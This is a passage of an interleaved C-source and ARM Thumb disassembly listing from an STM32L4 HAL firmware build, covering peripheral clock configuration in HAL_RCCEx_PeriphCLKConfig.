 8004566:	2301      	movs	r3, #1
 8004568:	e000      	b.n	800456c <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800456a:	2300      	movs	r3, #0
}
 800456c:	4618      	mov	r0, r3
 800456e:	3718      	adds	r7, #24
 8004570:	46bd      	mov	sp, r7
 8004572:	bd80      	pop	{r7, pc}
 8004574:	40021000 	.word	0x40021000
 8004578:	40022000 	.word	0x40022000

0800457c <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 800457c:	b580      	push	{r7, lr}
 800457e:	b086      	sub	sp, #24
 8004580:	af00      	add	r7, sp, #0
 8004582:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004584:	2300      	movs	r3, #0
 8004586:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 8004588:	2300      	movs	r3, #0
 800458a:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 800458c:	687b      	ldr	r3, [r7, #4]
 800458e:	681b      	ldr	r3, [r3, #0]
 8004590:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004594:	2b00      	cmp	r3, #0
 8004596:	d031      	beq.n	80045fc <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004598:	687b      	ldr	r3, [r7, #4]
 800459a:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 800459c:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80045a0:	d01a      	beq.n	80045d8 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 80045a2:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80045a6:	d814      	bhi.n	80045d2 <HAL_RCCEx_PeriphCLKConfig+0x56>
 80045a8:	2b00      	cmp	r3, #0
 80045aa:	d009      	beq.n	80045c0 <HAL_RCCEx_PeriphCLKConfig+0x44>
 80045ac:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 80045b0:	d10f      	bne.n	80045d2 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 80045b2:	4b5d      	ldr	r3, [pc, #372]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b4:	68db      	ldr	r3, [r3, #12]
 80045b6:	4a5c      	ldr	r2, [pc, #368]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80045bc:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 80045be:	e00c      	b.n	80045da <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 80045c0:	687b      	ldr	r3, [r7, #4]
 80045c2:	3304      	adds	r3, #4
 80045c4:	2100      	movs	r1, #0
 80045c6:	4618      	mov	r0, r3
 80045c8:	f000 f9de 	bl	8004988 <RCCEx_PLLSAI1_Config>
 80045cc:	4603      	mov	r3, r0
 80045ce:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 80045d0:	e003      	b.n	80045da <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 80045d2:	2301      	movs	r3, #1
 80045d4:	74fb      	strb	r3, [r7, #19]
      break;
 80045d6:	e000      	b.n	80045da <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 80045d8:	bf00      	nop
    }

    if(ret == HAL_OK)
 80045da:	7cfb      	ldrb	r3, [r7, #19]
 80045dc:	2b00      	cmp	r3, #0
 80045de:	d10b      	bne.n	80045f8 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 80045e0:	4b51      	ldr	r3, [pc, #324]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045e2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80045e6:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 80045ea:	687b      	ldr	r3, [r7, #4]
 80045ec:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80045ee:	494e      	ldr	r1, [pc, #312]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045f0:	4313      	orrs	r3, r2
 80045f2:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 80045f6:	e001      	b.n	80045fc <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 80045f8:	7cfb      	ldrb	r3, [r7, #19]
 80045fa:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 80045fc:	687b      	ldr	r3, [r7, #4]
 80045fe:	681b      	ldr	r3, [r3, #0]
 8004600:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004604:	2b00      	cmp	r3, #0
 8004606:	f000 809e 	beq.w	8004746 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 800460a:	2300      	movs	r3, #0
 800460c:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 800460e:	4b46      	ldr	r3, [pc, #280]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004610:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004612:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004616:	2b00      	cmp	r3, #0
 8004618:	d101      	bne.n	800461e <HAL_RCCEx_PeriphCLKConfig+0xa2>
 800461a:	2301      	movs	r3, #1
 800461c:	e000      	b.n	8004620 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 800461e:	2300      	movs	r3, #0
 8004620:	2b00      	cmp	r3, #0
 8004622:	d00d      	beq.n	8004640 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8004624:	4b40      	ldr	r3, [pc, #256]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004626:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004628:	4a3f      	ldr	r2, [pc, #252]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800462a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800462e:	6593      	str	r3, [r2, #88]	; 0x58
 8004630:	4b3d      	ldr	r3, [pc, #244]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004632:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004634:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004638:	60bb      	str	r3, [r7, #8]
 800463a:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 800463c:	2301      	movs	r3, #1
 800463e:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8004640:	4b3a      	ldr	r3, [pc, #232]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004642:	681b      	ldr	r3, [r3, #0]
 8004644:	4a39      	ldr	r2, [pc, #228]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004646:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800464a:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 800464c:	f7fc fdda 	bl	8001204 <HAL_GetTick>
 8004650:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004652:	e009      	b.n	8004668 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8004654:	f7fc fdd6 	bl	8001204 <HAL_GetTick>
 8004658:	4602      	mov	r2, r0
 800465a:	68fb      	ldr	r3, [r7, #12]
 800465c:	1ad3      	subs	r3, r2, r3
 800465e:	2b02      	cmp	r3, #2
 8004660:	d902      	bls.n	8004668 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004662:	2303      	movs	r3, #3
 8004664:	74fb      	strb	r3, [r7, #19]
        break;
 8004666:	e005      	b.n	8004674 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004668:	4b30      	ldr	r3, [pc, #192]	; (800472c <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800466a:	681b      	ldr	r3, [r3, #0]
 800466c:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004670:	2b00      	cmp	r3, #0
 8004672:	d0ef      	beq.n	8004654 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004674:	7cfb      	ldrb	r3, [r7, #19]
 8004676:	2b00      	cmp	r3, #0
 8004678:	d15a      	bne.n	8004730 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 800467a:	4b2b      	ldr	r3, [pc, #172]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800467c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004680:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004684:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 8004686:	697b      	ldr	r3, [r7, #20]
 8004688:	2b00      	cmp	r3, #0
 800468a:	d01e      	beq.n	80046ca <HAL_RCCEx_PeriphCLKConfig+0x14e>
 800468c:	687b      	ldr	r3, [r7, #4]
 800468e:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004690:	697a      	ldr	r2, [r7, #20]
 8004692:	429a      	cmp	r2, r3
 8004694:	d019      	beq.n	80046ca <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 8004696:	4b24      	ldr	r3, [pc, #144]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004698:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800469c:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80046a0:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 80046a2:	4b21      	ldr	r3, [pc, #132]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046a4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046a8:	4a1f      	ldr	r2, [pc, #124]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046aa:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80046ae:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 80046b2:	4b1d      	ldr	r3, [pc, #116]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046b4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046b8:	4a1b      	ldr	r2, [pc, #108]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046ba:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80046be:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 80046c2:	4a19      	ldr	r2, [pc, #100]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046c4:	697b      	ldr	r3, [r7, #20]
 80046c6:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 80046ca:	697b      	ldr	r3, [r7, #20]
 80046cc:	f003 0301 	and.w	r3, r3, #1
 80046d0:	2b00      	cmp	r3, #0
 80046d2:	d016      	beq.n	8004702 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80046d4:	f7fc fd96 	bl	8001204 <HAL_GetTick>
 80046d8:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80046da:	e00b      	b.n	80046f4 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 80046dc:	f7fc fd92 	bl	8001204 <HAL_GetTick>
 80046e0:	4602      	mov	r2, r0
 80046e2:	68fb      	ldr	r3, [r7, #12]
 80046e4:	1ad3      	subs	r3, r2, r3
 80046e6:	f241 3288 	movw	r2, #5000	; 0x1388
 80046ea:	4293      	cmp	r3, r2
 80046ec:	d902      	bls.n	80046f4 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 80046ee:	2303      	movs	r3, #3
 80046f0:	74fb      	strb	r3, [r7, #19]
            break;
 80046f2:	e006      	b.n	8004702 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80046f4:	4b0c      	ldr	r3, [pc, #48]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80046f6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80046fa:	f003 0302 	and.w	r3, r3, #2
 80046fe:	2b00      	cmp	r3, #0
 8004700:	d0ec      	beq.n	80046dc <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 8004702:	7cfb      	ldrb	r3, [r7, #19]
 8004704:	2b00      	cmp	r3, #0
 8004706:	d10b      	bne.n	8004720 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 8004708:	4b07      	ldr	r3, [pc, #28]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800470a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800470e:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 8004712:	687b      	ldr	r3, [r7, #4]
 8004714:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004716:	4904      	ldr	r1, [pc, #16]	; (8004728 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004718:	4313      	orrs	r3, r2
 800471a:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 800471e:	e009      	b.n	8004734 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004720:	7cfb      	ldrb	r3, [r7, #19]
 8004722:	74bb      	strb	r3, [r7, #18]
 8004724:	e006      	b.n	8004734 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 8004726:	bf00      	nop
 8004728:	40021000 	.word	0x40021000
 800472c:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004730:	7cfb      	ldrb	r3, [r7, #19]
 8004732:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004734:	7c7b      	ldrb	r3, [r7, #17]
 8004736:	2b01      	cmp	r3, #1
 8004738:	d105      	bne.n	8004746 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800473a:	4b8a      	ldr	r3, [pc, #552]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800473c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800473e:	4a89      	ldr	r2, [pc, #548]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004740:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004744:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 8004746:	687b      	ldr	r3, [r7, #4]
 8004748:	681b      	ldr	r3, [r3, #0]
 800474a:	f003 0301 	and.w	r3, r3, #1
 800474e:	2b00      	cmp	r3, #0
 8004750:	d00a      	beq.n	8004768 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 8004752:	4b84      	ldr	r3, [pc, #528]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004754:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004758:	f023 0203 	bic.w	r2, r3, #3
 800475c:	687b      	ldr	r3, [r7, #4]
 800475e:	6a1b      	ldr	r3, [r3, #32]
 8004760:	4980      	ldr	r1, [pc, #512]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004762:	4313      	orrs	r3, r2
 8004764:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 8004768:	687b      	ldr	r3, [r7, #4]
 800476a:	681b      	ldr	r3, [r3, #0]
 800476c:	f003 0302 	and.w	r3, r3, #2
 8004770:	2b00      	cmp	r3, #0
 8004772:	d00a      	beq.n	800478a <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004774:	4b7b      	ldr	r3, [pc, #492]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004776:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800477a:	f023 020c 	bic.w	r2, r3, #12
 800477e:	687b      	ldr	r3, [r7, #4]
 8004780:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004782:	4978      	ldr	r1, [pc, #480]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004784:	4313      	orrs	r3, r2
 8004786:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800478a:	687b      	ldr	r3, [r7, #4]
 800478c:	681b      	ldr	r3, [r3, #0]
 800478e:	f003 0320 	and.w	r3, r3, #32
 8004792:	2b00      	cmp	r3, #0
 8004794:	d00a      	beq.n	80047ac <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 8004796:	4b73      	ldr	r3, [pc, #460]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004798:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800479c:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 80047a0:	687b      	ldr	r3, [r7, #4]
 80047a2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80047a4:	496f      	ldr	r1, [pc, #444]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047a6:	4313      	orrs	r3, r2
 80047a8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 80047ac:	687b      	ldr	r3, [r7, #4]
 80047ae:	681b      	ldr	r3, [r3, #0]
 80047b0:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80047b4:	2b00      	cmp	r3, #0
 80047b6:	d00a      	beq.n	80047ce <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 80047b8:	4b6a      	ldr	r3, [pc, #424]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ba:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047be:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 80047c2:	687b      	ldr	r3, [r7, #4]
 80047c4:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80047c6:	4967      	ldr	r1, [pc, #412]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047c8:	4313      	orrs	r3, r2
 80047ca:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 80047ce:	687b      	ldr	r3, [r7, #4]
 80047d0:	681b      	ldr	r3, [r3, #0]
 80047d2:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80047d6:	2b00      	cmp	r3, #0
 80047d8:	d00a      	beq.n	80047f0 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 80047da:	4b62      	ldr	r3, [pc, #392]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047dc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047e0:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 80047e4:	687b      	ldr	r3, [r7, #4]
 80047e6:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80047e8:	495e      	ldr	r1, [pc, #376]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ea:	4313      	orrs	r3, r2
 80047ec:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 80047f0:	687b      	ldr	r3, [r7, #4]
 80047f2:	681b      	ldr	r3, [r3, #0]
 80047f4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80047f8:	2b00      	cmp	r3, #0
 80047fa:	d00a      	beq.n	8004812 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 80047fc:	4b59      	ldr	r3, [pc, #356]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047fe:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004802:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 8004806:	687b      	ldr	r3, [r7, #4]
 8004808:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800480a:	4956      	ldr	r1, [pc, #344]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800480c:	4313      	orrs	r3, r2
 800480e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 8004812:	687b      	ldr	r3, [r7, #4]
 8004814:	681b      	ldr	r3, [r3, #0]
 8004816:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800481a:	2b00      	cmp	r3, #0
 800481c:	d00a      	beq.n	8004834 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 800481e:	4b51      	ldr	r3, [pc, #324]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004820:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004824:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 8004828:	687b      	ldr	r3, [r7, #4]
 800482a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800482c:	494d      	ldr	r1, [pc, #308]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800482e:	4313      	orrs	r3, r2
 8004830:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 8004834:	687b      	ldr	r3, [r7, #4]
 8004836:	681b      	ldr	r3, [r3, #0]
 8004838:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 800483c:	2b00      	cmp	r3, #0
 800483e:	d028      	beq.n	8004892 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 8004840:	4b48      	ldr	r3, [pc, #288]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004842:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004846:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800484a:	687b      	ldr	r3, [r7, #4]
 800484c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 800484e:	4945      	ldr	r1, [pc, #276]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004850:	4313      	orrs	r3, r2
 8004852:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 8004856:	687b      	ldr	r3, [r7, #4]
 8004858:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 800485a:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 800485e:	d106      	bne.n	800486e <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004860:	4b40      	ldr	r3, [pc, #256]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004862:	68db      	ldr	r3, [r3, #12]
 8004864:	4a3f      	ldr	r2, [pc, #252]	; (8004964 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004866:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
